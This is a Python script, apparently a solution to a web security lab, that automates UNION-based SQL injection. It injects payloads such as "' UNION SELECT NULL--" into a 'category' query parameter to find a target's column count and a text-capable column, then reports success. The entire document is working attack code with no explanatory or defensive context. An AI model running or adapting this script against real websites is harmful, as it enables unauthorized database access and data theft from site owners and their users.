import sys
import validators
import requests

class Exploit():
    def __init__(self) -> None:
        self.url = ''
        self.data = {}
        self.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
        self.payload = ''
        self.column_num = 1
        self.str_column_idx = 0
        self.check_params()
        self.set_url()
        self.column_num_is_found = False
        self.str_column_is_found = False
        self.is_successful = False
    
    def check_params(self) -> None:
        if len(sys.argv) < 2:
            print(f'[-] Usage: {sys.argv[0]} <URL>')
            print(f'[-] Example: http://example.com')
            exit()
    
    def set_url(self) -> None:
        url = sys.argv[1]
        if not validators.url(url):
            print(f'[-] The URL "{url}" is not valid.')
            print('[-] Example of a valid URL: http://example.com')
            exit()
        
        self.url = url
    
    def set_payload(self) -> None:
        if not self.column_num_is_found:
            nulls = ', '.join(['NULL']*self.column_num)
            self.payload = f"' UNION SELECT {nulls}--"
        else:
            nulls = ['NULL']*self.column_num
            nulls[self.str_column_idx] = "'ytsdaC'"
            nulls = ', '.join(nulls)
            self.payload = f"' UNION SELECT {nulls}--"

    def find_column_nums(self) -> None:
        print('[+] Figuring out number of columns...')
        res = 'Internal Server Error'

        while 'Internal Server Error' in res:
            if self.column_num == 50:
                return

            self.set_payload()
            self.data['category'] = 'Pets' + self.payload
            req = requests.get(self.url, params=self.data)
            res = req.text
            self.column_num += 1
        
        self.column_num_is_found = True
        self.column_num -= 1
        print(f'[+] The number of columns is {self.column_num}')
    
    def find_str_column(self) -> None:
        print('[+] Figuring out string column...')
        res = 'Internal Server Error'

        while 'Internal Server Error' in res:
            if self.str_column_idx >= self.column_num:
                return

            self.set_payload()
            self.data['category'] = 'Pets' + self.payload
            req = requests.get(self.url, params=self.data)
            res = req.text
            self.str_column_idx += 1
            
        self.str_column_is_found = True
        print(f'[+] The string column is {self.str_column_idx}')
    
    def run(self) -> None:
        self.find_column_nums()
        self.find_str_column()
        if self.column_num_is_found and self.str_column_is_found:
            self.is_successful = True

def main() -> None:
    exploit = Exploit()
    exploit.run()

    if exploit.is_successful:
        print('[+] The exploit was successfull!')
    else:
        print('[-] The exploit was not successful!')

if __name__ == '__main__':
    main()